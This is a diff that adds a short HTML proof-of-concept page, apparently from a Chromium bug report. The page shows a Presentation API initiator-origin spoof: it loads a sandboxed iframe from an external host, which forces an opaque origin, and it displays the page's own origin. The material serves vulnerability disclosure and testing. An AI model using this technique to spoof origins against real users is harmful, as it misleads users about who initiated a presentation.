@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#testFrame { width: 600px; height: 400px; }
+</style>
+<title>PoC: Presentation initiator spoof</title>
+</head>
+<body>
+<h1>PoC: Presentation initiator spoof, opaque origin forced by iframe</h1>
+<p>This PoC uses sandbox allow-same-origin in this top-most page, but the iframe creates another sandboxed iframe without allow-same-origin</p>
+<p>Top-most page on <span id="originOutput"></span></p>
+<iframe id="testFrame" sandbox="allow-scripts allow-presentation allow-same-origin" src="https://aogarantiza.com/chromium/presentation-frame-opaque-2.html"></iframe>
+<script>
+originOutput.innerText = window.location.origin;
+</script>
+</body>
+</html>
